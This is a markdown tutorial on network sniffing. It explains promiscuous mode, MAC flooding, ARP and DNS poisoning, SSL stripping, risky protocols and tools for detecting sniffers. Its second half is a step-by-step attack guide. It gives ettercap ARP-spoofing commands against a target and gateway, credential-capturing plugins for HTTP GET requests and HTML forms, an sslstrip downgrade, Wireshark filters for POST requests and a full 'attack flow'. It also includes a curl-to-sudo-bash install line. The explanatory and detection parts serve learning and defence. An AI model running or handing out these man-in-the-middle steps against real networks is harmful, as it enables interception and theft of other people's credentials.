# Sniffing & Network Attacks

## 1. What is Sniffing?
**Sniffing** is the process of monitoring and capturing network traffic flowing through a network. Think of it as installing a digital CCTV on your internet wire... except it sees everything you send and receive — passwords, chats, files, even the websites you visit.

> **Note:** If the data is not encrypted, it’s game over. Anyone running a sniffer tool can see your private data in plain text.

---

## 2. Is Sniffing Illegal?
Sniffing itself isn't always illegal. It depends on intent and authorization.

| Illegal When: | Legal When: |
| :--- | :--- |
| You intercept data **not meant for you**. | You're **testing your own network**. |
| You do it **without authorization**. | You have **explicit permission**. |
| You **store or misuse** captured data. | You're doing **forensics or auditing**. |

> "Sniffing without permission is like reading someone's WhatsApp chats just because you're on the same Wi-Fi — creepy and illegal."

---

## 3. Promiscuous Mode – The Heart of Sniffing
**Promiscuous Mode** allows your network card to capture **all packets**, not just the ones meant for you.

* **Normal Mode:** Your PC only sees its own traffic.
* **Promiscuous Mode:** The card listens to *every* conversation on the network.
* **Used In:** Wireshark, Tcpdump, Cain & Abel.

---

## 4. Network Attacks (Active Sniffing)

### A. MAC Flooding - How to Fool the Switch
Modern networks use switches that send packets only to the intended device. Attackers can flood the switch's MAC table with fake addresses until it stops functioning correctly.

* **What Happens:** The switch fails to decide where to send traffic and begins **broadcasting to all ports** (acting like a hub). The attacker in Promiscuous Mode then gets all the data.

### B. ARP Poisoning - The Hacker's Shortcut
**ARP (Address Resolution Protocol)** connects IP addresses to MAC addresses inside a network.

* **The Attack:** The attacker sends fake ARP replies claiming:
    * "Hey router, I'm the victim!"
    * "Hey victim, I'm the router!"
* **Result:** All traffic flows through the attacker's system.
* **Tools:** Ettercap, Cain & Abel, Bettercap.

### C. DNS Poisoning / Redirection
Used alongside sniffing to redirect traffic.
1.  **Fake DNS response:** Victim lands on attacker-controlled site.
2.  **Sniffing:** Attacker then captures all credentials.

---

## 5. SSL Stripping
A technique used to downgrade a secure **HTTPS** connection to **HTTP**, making it easy to sniff credentials that were supposed to be encrypted.

**How it works (Step-by-Step):**
1.  Victim connects to public Wi-Fi.
2.  Attacker performs ARP poisoning (MITM).
3.  Victim visits a website (e.g., facebook.com).
4.  Site redirects from `http://` -> `https://`.
5.  **Attacker intercepts this redirect.**
6.  Victim sees site content over **HTTP**.
7.  Credentials go to attacker in **plain text**.

* **Tool used:** `sslstrip` (created by Moxie Marlinspike).

---

## 6. Protocols Ranked by Risk
"Secure connection ≠ green padlock only... It means your data isn't being served on a plate to attackers."

| Protocol | Risk Level | Safe Alternative |
| :--- | :--- | :--- |
| **HTTP** | Very High | HTTPS |
| **FTP** | Very High | SFTP / FTPS |
| **Telnet** | Extreme | SSH |
| **POP3/IMAP** | High | POP3S / IMAPS |

---

## 7. Tools to Detect Sniffers
How to find if someone is sniffing your network:

| Tool | Use |
| :--- | :--- |
| **Nmap** | Use to detect open ports and promiscuous devices. |
| **Wireshark** | Analyze ARP replies, DNS anomalies. |
| **AntiSniff** | Detects systems in promiscuous mode. |
| **XArp** | Detects ARP poisoning attempts. |
| **arpwatch** | Monitors for MAC/IP changes. |

### Bonus: Nmap Detection Command
```bash
# Check for duplicate MACs or unusual OS fingerprints
nmap -sP 192.168.1.0/24
```

# Comprehensive Guide to Using Ettercap, Bettercap, Wireshark, and SSLStrip

## Overview of Tools
* **Ettercap:** Network sniffer/sniffer-based MITM tool
* **Bettercap:** Advanced MITM framework
* **Wireshark:** Packet analysis tool
* **SSLStrip:** HTTP-to-HTTPS downgrade tool

---

## Setup Requirements

### Hardware
* Dual NIC setup (one connected to network, one bridged)
* Linux machine with networking capabilities

---

## Installation Commands

```bash
# Ettercap
sudo apt-get install ettercap-graphical

# Bettercap
curl -s [https://bettercap.org/install](https://bettercap.org/install) | sudo bash

# Wireshark
sudo apt-get install wireshark

# SSLStrip
sudo apt-get install sslstrip

```

## Usage 

``` bash
# ettercap 
ettercap -G
ettercap -T -q -M arp:remote /targetip// /gatewayip//
# bettercap
bettercap -iface eth0
set arp.spoof.targets <target_ip>
arp.spoof on
# Wireshark
wireshark -i eth0
tcp.port == 80 || tcp.port == 443
#sslstrip
sslstrip -l 8080 -a -k -f
```

# Practical Attack Scenarios

### 1. Basic MITM Attack
```
# Step 1: Start ARP spoofing
ettercap -T -q -M arp:remote /targetip// /gatewayip//

# Step 2: Capture credentials
ettercap -T -q -M arp:remote /targetip// /gatewayip// -P http_get -P html_form
```

### 2. SSL Downgrade Attack
```
# Step 1: Start ARP spoofing
ettercap -T -q -M arp:remote /targetip// /gatewayip//

# Step 2: Start SSLStrip
sslstrip -l 8080 -a -k -f

# Step 3: Capture credentials
ettercap -T -q -M arp:remote /targetip// /gatewayip// -P http_get -P html_form
```

### 3. Advanced Wireshark Analysis
```
# Capture packets and analyze
wireshark -i eth0 -Y "http.request.method == 'POST'"
```

## Complete Attack Flow
``` bash
# Configure interfaces
ip link set eth0 promisc on

# Start ARP spoofing
ettercap -T -q -M arp:remote /targetip// /gatewayip//

# Start SSLStrip if needed
sslstrip -l 8080 -a -k -f

# Start Wireshark with filters
wireshark -i eth0 -Y "http.request.method == 'POST'"

# Start credential capture
ettercap -T -q -M arp:remote /targetip// /gatewayip// -P http_get -P html_form

# Export captured data
tcpdump -i eth0 -w captured.pcap

# Analyze exported data
wireshark captured.pcap

```

